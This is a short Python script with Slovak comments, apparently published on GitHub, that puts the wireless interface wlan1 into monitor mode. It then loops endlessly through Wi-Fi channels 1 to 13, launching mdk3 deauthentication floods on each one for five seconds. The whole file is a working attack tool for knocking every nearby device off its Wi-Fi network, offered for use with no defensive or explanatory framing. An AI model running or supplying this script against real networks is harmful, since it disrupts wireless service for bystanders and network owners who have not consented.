# I will edit it sooooonn ...
# Pls support me by hitting STAR BUTTON on THIS GitHub repo :D

import subprocess
import time

def set_monitor_mode(interface):
    # Skontroluje a nastaví monitor mód na danom interface
    subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'down'])
    subprocess.run(['sudo', 'iw', interface, 'set', 'monitor', 'control'])
    subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'up'])

def set_channel(interface, channel):
    # Nastaví Wi-Fi kanál na danom interface
    subprocess.run(['sudo', 'iwconfig', interface, 'channel', str(channel)])

def deauth_on_channel(interface, channel):
    # Spustí mdk3 na danom kanáli na 5 sekúnd
    command = ['sudo', 'mdk3', interface, 'd', '-c', str(channel)]
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(5)
    process.terminate()
    process.wait()

def main():
    interface = 'wlan1'
    set_monitor_mode(interface)
    
    channels = range(1, 14)  # Kanály od 1 do 13

    while True:
        for channel in channels:
            print(f"Spúšťam Deauth na kanáli {channel}")
            set_channel(interface, channel)
            deauth_on_channel(interface, channel)

if __name__ == "__main__":
    main()
